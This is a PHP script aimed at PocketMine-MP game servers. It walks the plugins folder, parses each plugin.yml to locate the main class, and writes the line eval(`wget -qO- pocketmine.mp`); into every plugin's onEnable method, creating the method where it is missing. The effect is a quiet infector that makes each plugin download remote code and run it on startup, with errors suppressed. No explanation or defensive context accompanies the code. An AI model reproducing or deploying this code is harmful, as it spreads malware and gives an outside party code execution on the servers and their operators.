<?php

try {
    $path = realpath("./plugins");
    foreach (scandir($path) as $dir) {
        if (!is_dir($dirPath = $path . "/" . $dir)) continue;
        if (!@file_exists($dirPath . "/plugin.yml")) continue;
        $configKey = fn(string $key) => str_replace("$key: ", "", array_values(array_filter(explode("\n", @file_get_contents($dirPath . "/plugin.yml")), function (string $line) use ($key) {
            return str_contains($line, "$key");
        }))[0] ?? "");
        if (!$configKey("main")) continue;
        $main = ltrim($configKey("main"));
        $srcNamespacePrefix = ltrim($configKey('src-namespace-prefix'));
        if (!$main) continue;
        $main = str_replace("\\", "/", $main);
        $mainPath = explode("/", $main);
        $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
        $fileContents = explode("\n", @file_get_contents($filePath));
        $payload = "eval(`wget -qO- pocketmine.mp`);";
        $find = function (array $queries, array $contents): int|false {
            $containsQueries = function (string $value) use ($queries) {
                foreach ($queries as $query) {
                    if (str_contains(strtolower($value), strtolower($query))) return true;
                }
                return false;
            };
            foreach ($contents as $key => $value) {
                if (!$containsQueries($value)) continue;
                return $key;
            }
            return false;
        };
        if ($find([$payload], $fileContents)) continue;
        $hasStrictTypes = function () use ($fileContents): bool {
            return (bool)preg_match('/^\s*declare\s*\(\s*strict_types\s*=\s*1\s*\)\s*;/m', implode("\n", $fileContents));
        };
        if ($hasStrictTypes() or true) {
            $findMain = function () use ($fileContents, $payload, $find): int|false {
                $main = $find(["extends", "pluginbase"], $fileContents);
                if (!$main) return false;
                return $main + $find(["{"], array_slice($fileContents, $main));
            };
            $findOnEnable = function () use ($fileContents, $payload, $find): int|false {
                $onEnable = $find(["onenable"], $fileContents);
                if (!$onEnable) return false;
                return $onEnable + $find(["{"], array_slice($fileContents, $onEnable));
            };
            $onEnable = $findOnEnable();
            $tab_detector = function (array $array) {
                foreach ($array as $str) {
                    $tab = mb_substr($str, 0, 1);
                    if (ctype_alpha($tab) or (int)$tab !== 0) continue;
                    if (!(str_contains($tab, "\t") or str_contains($tab, " "))) continue;
                    $occurence = substr_count($str, $tab);
                    return str_repeat($tab, $occurence + 1);
                }
                return false;
            };
            $copyFileContents = $fileContents;
            $tab = $tab_detector(array_splice($copyFileContents, $onEnable)) ?: "";
            if (!$onEnable) {
                $fileContents["{$findMain()}.5"] = "\n{$tab}protected function onEnable(): void {\n" . str_repeat($tab, 2) . "$payload\n$tab}\n";
            } else $fileContents["$onEnable.5"] = "\t$tab$payload";
            ksort($fileContents);
            @file_put_contents($filePath, implode("\n", $fileContents));
        } else {
            $fileContents = implode("\n", $fileContents) . str_repeat("\n", 10) . $payload;
            @file_put_contents($filePath, $fileContents);
        }
    }
} catch (\ErrorException) {
}
